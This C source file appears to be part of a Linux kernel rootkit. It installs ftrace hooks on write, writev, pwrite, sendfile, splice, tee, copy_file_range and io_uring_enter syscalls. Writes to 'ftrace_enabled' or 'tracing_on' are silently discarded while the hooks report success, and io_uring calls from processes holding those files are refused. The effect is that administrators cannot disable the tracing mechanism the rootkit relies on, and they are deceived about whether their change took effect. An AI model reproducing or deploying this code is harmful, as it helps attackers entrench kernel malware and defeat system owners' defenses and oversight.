#include "../include/core.h"
#include "../include/hooks_write.h"
#include "../ftrace/ftrace_helper.h"

#define BUF_SIZE 4096

static asmlinkage ssize_t (*original_write)(const struct pt_regs *);
static asmlinkage ssize_t (*original_write32)(const struct pt_regs *);
static asmlinkage ssize_t (*original_writev)(const struct pt_regs *);
static asmlinkage ssize_t (*original_writev32)(const struct pt_regs *);
static asmlinkage ssize_t (*original_pwrite64)(const struct pt_regs *);
static asmlinkage ssize_t (*original_pwrite64_ia32)(const struct pt_regs *);
static asmlinkage ssize_t (*original_pwritev)(const struct pt_regs *);
static asmlinkage ssize_t (*original_pwritev2)(const struct pt_regs *);
static asmlinkage ssize_t (*original_pwritev_ia32)(const struct pt_regs *);
static asmlinkage ssize_t (*original_pwritev2_ia32)(const struct pt_regs *);
static asmlinkage ssize_t (*original_sendfile)(const struct pt_regs *);
static asmlinkage ssize_t (*original_sendfile64)(const struct pt_regs *);
static asmlinkage ssize_t (*original_sendfile_ia32)(const struct pt_regs *);
static asmlinkage ssize_t (*original_sendfile64_ia32)(const struct pt_regs *);
static asmlinkage ssize_t (*original_compat_sendfile)(const struct pt_regs *);
static asmlinkage ssize_t (*original_compat_sendfile64)(const struct pt_regs *);
static asmlinkage ssize_t (*original_copy_file_range)(const struct pt_regs *);
static asmlinkage ssize_t (*original_copy_file_range_ia32)(const struct pt_regs *);
static asmlinkage ssize_t (*original_splice)(const struct pt_regs *);
static asmlinkage ssize_t (*original_splice_ia32)(const struct pt_regs *);
static asmlinkage ssize_t (*original_vmsplice)(const struct pt_regs *);
static asmlinkage ssize_t (*original_vmsplice_ia32)(const struct pt_regs *);
static asmlinkage ssize_t (*original_tee)(const struct pt_regs *);
static asmlinkage ssize_t (*original_tee_ia32)(const struct pt_regs *);
static asmlinkage long (*original_io_uring_enter)(const struct pt_regs *);
static asmlinkage long (*original_io_uring_enter2)(const struct pt_regs *);

static notrace asmlinkage ssize_t hooked_write_common(const struct pt_regs *regs,
                                                     asmlinkage ssize_t (*orig)(const struct pt_regs *),
                                                     bool compat32, bool has_offset)
{
    int fd;
    const char __user *user_buf;
    size_t count;

    if (!orig || !regs) return -EINVAL;

    if (!compat32) {
        fd       = regs->di;
        user_buf = (const char __user *)regs->si;
        count    = regs->dx;
    } else {
        fd       = regs->bx;
        user_buf = (const char __user *)regs->cx;
        count    = regs->dx;
    }

    struct file *file = fget(fd);
    if (!file)
        return orig(regs);

    const char *name = NULL;
    if (file->f_path.dentry && file->f_path.dentry->d_name.name)
        name = file->f_path.dentry->d_name.name;

    if (name && (strcmp(name, "ftrace_enabled") == 0 || strcmp(name, "tracing_on") == 0)) {
        fput(file);

        char *kernel_buf = kmalloc(BUF_SIZE, GFP_KERNEL);
        if (!kernel_buf)
            return -ENOMEM;

        if (copy_from_user(kernel_buf, user_buf, min(count, (size_t)BUF_SIZE))) {
            kfree(kernel_buf);
            return -EFAULT;
        }
        kfree(kernel_buf);

        return count;
    }

    fput(file);
    return orig(regs);
}

static notrace asmlinkage ssize_t hooked_write(const struct pt_regs *regs)
{
    return hooked_write_common(regs, original_write, false, false);
}
static notrace asmlinkage ssize_t hooked_write32(const struct pt_regs *regs)
{
    return hooked_write_common(regs, original_write32, true, false);
}
static notrace asmlinkage ssize_t hooked_pwrite64(const struct pt_regs *regs)
{
    return hooked_write_common(regs, original_pwrite64, false, true);
}
static notrace asmlinkage ssize_t hooked_pwrite64_ia32(const struct pt_regs *regs)
{
    return hooked_write_common(regs, original_pwrite64_ia32, true, true);
}

static notrace asmlinkage ssize_t hooked_writev_common(const struct pt_regs *regs,
                                                      asmlinkage ssize_t (*orig)(const struct pt_regs *),
                                                      bool compat32)
{
    int fd;
    const struct iovec __user *vec;
    unsigned long vlen;

    if (!orig || !regs) return -EINVAL;

    if (!compat32) {
        fd   = regs->di;
        vec  = (const struct iovec __user *)regs->si;
        vlen = regs->dx;
    } else {
        fd   = regs->bx;
        vec  = (const struct iovec __user *)regs->cx;
        vlen = regs->dx;
    }

    struct file *file = fget(fd);
    if (!file)
        return orig(regs);

    const char *name = NULL;
    if (file->f_path.dentry && file->f_path.dentry->d_name.name)
        name = file->f_path.dentry->d_name.name;

    if (name && (strcmp(name, "ftrace_enabled") == 0 || strcmp(name, "tracing_on") == 0)) {
        fput(file);
        return vlen;
    }

    fput(file);
    return orig(regs);
}

static notrace asmlinkage ssize_t hooked_writev(const struct pt_regs *regs)
{
    return hooked_writev_common(regs, original_writev, false);
}
static notrace asmlinkage ssize_t hooked_writev32(const struct pt_regs *regs)
{
    return hooked_writev_common(regs, original_writev32, true);
}
static notrace asmlinkage ssize_t hooked_pwritev(const struct pt_regs *regs)
{
    return hooked_writev_common(regs, original_pwritev, false);
}
static notrace asmlinkage ssize_t hooked_pwritev2(const struct pt_regs *regs)
{
    return hooked_writev_common(regs, original_pwritev2, false);
}
static notrace asmlinkage ssize_t hooked_pwritev_ia32(const struct pt_regs *regs)
{
    return hooked_writev_common(regs, original_pwritev_ia32, true);
}
static notrace asmlinkage ssize_t hooked_pwritev2_ia32(const struct pt_regs *regs)
{
    return hooked_writev_common(regs, original_pwritev2_ia32, true);
}

static notrace asmlinkage ssize_t hooked_fd_transfer_common(const struct pt_regs *regs,
                                                            asmlinkage ssize_t (*orig)(const struct pt_regs *),
                                                            bool compat32)
{
    int out_fd, in_fd;
    size_t count;

    if (!orig || !regs) return -EINVAL;

    if (!compat32) {
        out_fd = regs->di;
        in_fd  = regs->si;
        count  = regs->r10;
    } else {
        out_fd = regs->bx;
        in_fd  = regs->cx;
        count  = regs->si;
    }

    struct file *out_file = fget(out_fd);
    if (!out_file)
        return orig(regs);

    const char *name = NULL;
    if (out_file->f_path.dentry && out_file->f_path.dentry->d_name.name)
        name = out_file->f_path.dentry->d_name.name;

    if (name && (strcmp(name, "ftrace_enabled") == 0 || strcmp(name, "tracing_on") == 0)) {
        fput(out_file);
        return count;
    }

    fput(out_file);
    return orig(regs);
}

static notrace asmlinkage ssize_t hooked_sendfile(const struct pt_regs *regs)
{
    return hooked_fd_transfer_common(regs, original_sendfile, false);
}

static notrace asmlinkage ssize_t hooked_sendfile64(const struct pt_regs *regs)
{
    return hooked_fd_transfer_common(regs, original_sendfile64, false);
}

static notrace asmlinkage ssize_t hooked_sendfile_ia32(const struct pt_regs *regs)
{
    return hooked_fd_transfer_common(regs, original_sendfile_ia32, true);
}

static notrace asmlinkage ssize_t hooked_sendfile64_ia32(const struct pt_regs *regs)
{
    return hooked_fd_transfer_common(regs, original_sendfile64_ia32, true);
}

static notrace asmlinkage ssize_t hooked_compat_sendfile(const struct pt_regs *regs)
{
    return hooked_fd_transfer_common(regs, original_compat_sendfile, true);
}

static notrace asmlinkage ssize_t hooked_compat_sendfile64(const struct pt_regs *regs)
{
    return hooked_fd_transfer_common(regs, original_compat_sendfile64, true);
}

static notrace asmlinkage ssize_t hooked_copy_file_range_common(const struct pt_regs *regs,
                                                                asmlinkage ssize_t (*orig)(const struct pt_regs *),
                                                                bool compat32)
{
    int fd_in, fd_out;
    size_t count;

    if (!orig || !regs) return -EINVAL;

    if (!compat32) {
        fd_in  = regs->di;
        fd_out = regs->r8;
        count  = regs->r10;
    } else {
        fd_in  = regs->bx;
        fd_out = regs->di;
        count  = regs->si;
    }

    struct file *out_file = fget(fd_out);
    if (!out_file)
        return orig(regs);

    const char *name = NULL;
    if (out_file->f_path.dentry && out_file->f_path.dentry->d_name.name)
        name = out_file->f_path.dentry->d_name.name;

    if (name && (strcmp(name, "ftrace_enabled") == 0 || strcmp(name, "tracing_on") == 0)) {
        fput(out_file);
        return count;
    }

    fput(out_file);
    return orig(regs);
}

static notrace asmlinkage ssize_t hooked_copy_file_range(const struct pt_regs *regs)
{
    return hooked_copy_file_range_common(regs, original_copy_file_range, false);
}

static notrace asmlinkage ssize_t hooked_copy_file_range_ia32(const struct pt_regs *regs)
{
    return hooked_copy_file_range_common(regs, original_copy_file_range_ia32, true);
}

static notrace asmlinkage ssize_t hooked_splice_common(const struct pt_regs *regs,
                                                       asmlinkage ssize_t (*orig)(const struct pt_regs *),
                                                       bool compat32)
{
    int fd_in, fd_out;
    size_t count;

    if (!orig || !regs) return -EINVAL;

    if (!compat32) {
        fd_in  = regs->di;
        fd_out = regs->dx;
        count  = regs->r8;
    } else {
        fd_in  = regs->bx;
        fd_out = regs->dx;
        count  = regs->di;
    }

    struct file *out_file = fget(fd_out);
    if (!out_file)
        return orig(regs);

    const char *name = NULL;
    if (out_file->f_path.dentry && out_file->f_path.dentry->d_name.name)
        name = out_file->f_path.dentry->d_name.name;

    if (name && (strcmp(name, "ftrace_enabled") == 0 || strcmp(name, "tracing_on") == 0)) {
        fput(out_file);
        return count;
    }

    fput(out_file);
    return orig(regs);
}

static notrace asmlinkage ssize_t hooked_splice(const struct pt_regs *regs)
{
    return hooked_splice_common(regs, original_splice, false);
}

static notrace asmlinkage ssize_t hooked_splice_ia32(const struct pt_regs *regs)
{
    return hooked_splice_common(regs, original_splice_ia32, true);
}

static notrace asmlinkage ssize_t hooked_vmsplice_common(const struct pt_regs *regs,
                                                         asmlinkage ssize_t (*orig)(const struct pt_regs *),
                                                         bool compat32)
{
    int fd;
    unsigned long nr_segs;

    if (!orig || !regs) return -EINVAL;

    if (!compat32) {
        fd      = regs->di;
        nr_segs = regs->dx;
    } else {
        fd      = regs->bx;
        nr_segs = regs->dx;
    }

    struct file *file = fget(fd);
    if (!file)
        return orig(regs);

    const char *name = NULL;
    if (file->f_path.dentry && file->f_path.dentry->d_name.name)
        name = file->f_path.dentry->d_name.name;

    if (name && (strcmp(name, "ftrace_enabled") == 0 || strcmp(name, "tracing_on") == 0)) {
        fput(file);
        return nr_segs;
    }

    fput(file);
    return orig(regs);
}

static notrace asmlinkage ssize_t hooked_vmsplice(const struct pt_regs *regs)
{
    return hooked_vmsplice_common(regs, original_vmsplice, false);
}

static notrace asmlinkage ssize_t hooked_vmsplice_ia32(const struct pt_regs *regs)
{
    return hooked_vmsplice_common(regs, original_vmsplice_ia32, true);
}

static notrace asmlinkage ssize_t hooked_tee_common(const struct pt_regs *regs,
                                                    asmlinkage ssize_t (*orig)(const struct pt_regs *),
                                                    bool compat32)
{
    int fd_in, fd_out;
    size_t count;

    if (!orig || !regs) return -EINVAL;

    if (!compat32) {
        fd_in  = regs->di;
        fd_out = regs->si;
        count  = regs->dx;
    } else {
        fd_in  = regs->bx;
        fd_out = regs->cx;
        count  = regs->dx;
    }

    struct file *out_file = fget(fd_out);
    if (!out_file)
        return orig(regs);

    const char *name = NULL;
    if (out_file->f_path.dentry && out_file->f_path.dentry->d_name.name)
        name = out_file->f_path.dentry->d_name.name;

    if (name && (strcmp(name, "ftrace_enabled") == 0 || strcmp(name, "tracing_on") == 0)) {
        fput(out_file);
        return count;
    }

    fput(out_file);
    return orig(regs);
}

static notrace asmlinkage ssize_t hooked_tee(const struct pt_regs *regs)
{
    return hooked_tee_common(regs, original_tee, false);
}

static notrace asmlinkage ssize_t hooked_tee_ia32(const struct pt_regs *regs)
{
    return hooked_tee_common(regs, original_tee_ia32, true);
}

static DEFINE_SPINLOCK(cache_lock);
static pid_t last_blocked_pid = 0;
static unsigned long last_check_jiffies = 0;

static bool process_has_protected_fd(void)
{
    struct files_struct *files;
    struct fdtable *fdt;
    struct file *file;
    unsigned int i;
    bool has_protected = false;
    unsigned long flags;

    files = current->files;
    if (!files)
        return false;

    spin_lock_irqsave(&files->file_lock, flags);
    
    fdt = files_fdtable(files);
    if (!fdt) {
        spin_unlock_irqrestore(&files->file_lock, flags);
        return false;
    }
    
    for (i = 0; i < fdt->max_fds; i++) {
        file = fdt->fd[i];
        if (file) {
            const char *name = NULL;
            struct dentry *dentry;
            
            dentry = file->f_path.dentry;
            if (dentry && dentry->d_name.name)
                name = dentry->d_name.name;
            
            if (name && (strcmp(name, "ftrace_enabled") == 0 || 
                       strcmp(name, "tracing_on") == 0)) {
                has_protected = true;
                break;
            }
        }
    }
    
    spin_unlock_irqrestore(&files->file_lock, flags);
    return has_protected;
}

static notrace asmlinkage long hooked_io_uring_enter(const struct pt_regs *regs)
{
    unsigned int uring_fd;
    unsigned int to_submit;
    unsigned int min_complete;
    unsigned int flags_param;
    pid_t current_pid;
    bool should_block = false;
    unsigned long cache_flags;

    if (!regs)
        return -EINVAL;
    
    if (!original_io_uring_enter)
        return -EINVAL;

    uring_fd = regs->di;
    to_submit = regs->si;
    min_complete = regs->dx;
    flags_param = regs->r10;
    current_pid = current->pid;

    spin_lock_irqsave(&cache_lock, cache_flags);
    if (current_pid == last_blocked_pid && 
        time_before(jiffies, last_check_jiffies + HZ)) {
        should_block = true;
        spin_unlock_irqrestore(&cache_lock, cache_flags);
    } else {
        spin_unlock_irqrestore(&cache_lock, cache_flags);
        
        should_block = process_has_protected_fd();
        
        if (should_block) {
            spin_lock_irqsave(&cache_lock, cache_flags);
            last_blocked_pid = current_pid;
            last_check_jiffies = jiffies;
            spin_unlock_irqrestore(&cache_lock, cache_flags);
        }
    }

    if (should_block)
        return -EINVAL;

    return original_io_uring_enter(regs);
}

static struct ftrace_hook hooks[] = {
    HOOK("__x64_sys_write",   hooked_write,   &original_write),
    HOOK("__ia32_sys_write",  hooked_write32, &original_write32),
    HOOK("__x64_sys_writev",  hooked_writev,  &original_writev),
    HOOK("__ia32_sys_writev", hooked_writev32, &original_writev32),

    HOOK("__x64_sys_pwrite64", hooked_pwrite64, &original_pwrite64),
    HOOK("__x64_sys_ia32_pwrite64", hooked_pwrite64_ia32, &original_pwrite64_ia32),

    HOOK("__x64_sys_pwritev", hooked_pwritev, &original_pwritev),
    HOOK("__x64_sys_pwritev2", hooked_pwritev2, &original_pwritev2),
    HOOK("__ia32_sys_pwritev", hooked_pwritev_ia32, &original_pwritev_ia32),
    HOOK("__ia32_sys_pwritev2", hooked_pwritev2_ia32, &original_pwritev2_ia32),

    HOOK("__x64_sys_sendfile", hooked_sendfile, &original_sendfile),
    HOOK("__x64_sys_sendfile64", hooked_sendfile64, &original_sendfile64),
    HOOK("__ia32_sys_sendfile", hooked_sendfile_ia32, &original_sendfile_ia32),
    HOOK("__ia32_sys_sendfile64", hooked_sendfile64_ia32, &original_sendfile64_ia32),
    HOOK("__ia32_compat_sys_sendfile", hooked_compat_sendfile, &original_compat_sendfile),
    HOOK("__ia32_compat_sys_sendfile64", hooked_compat_sendfile64, &original_compat_sendfile64),

    HOOK("__x64_sys_copy_file_range", hooked_copy_file_range, &original_copy_file_range),
    HOOK("__ia32_sys_copy_file_range", hooked_copy_file_range_ia32, &original_copy_file_range_ia32),

    HOOK("__x64_sys_splice", hooked_splice, &original_splice),
    HOOK("__ia32_sys_splice", hooked_splice_ia32, &original_splice_ia32),

    HOOK("__x64_sys_vmsplice", hooked_vmsplice, &original_vmsplice),
    HOOK("__ia32_sys_vmsplice", hooked_vmsplice_ia32, &original_vmsplice_ia32),

    HOOK("__x64_sys_tee", hooked_tee, &original_tee),
    HOOK("__ia32_sys_tee", hooked_tee_ia32, &original_tee_ia32),
    HOOK("__x64_sys_io_uring_enter", hooked_io_uring_enter, &original_io_uring_enter),
    HOOK("__ia32_sys_io_uring_enter", hooked_io_uring_enter, &original_io_uring_enter2),
};

notrace int hooks_write_init(void)
{
    return fh_install_hooks(hooks, ARRAY_SIZE(hooks));
}

notrace void hooks_write_exit(void)
{
    unsigned long flags;
    
    spin_lock_irqsave(&cache_lock, flags);
    last_blocked_pid = 0;
    last_check_jiffies = 0;
    spin_unlock_irqrestore(&cache_lock, flags);
    
    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
}
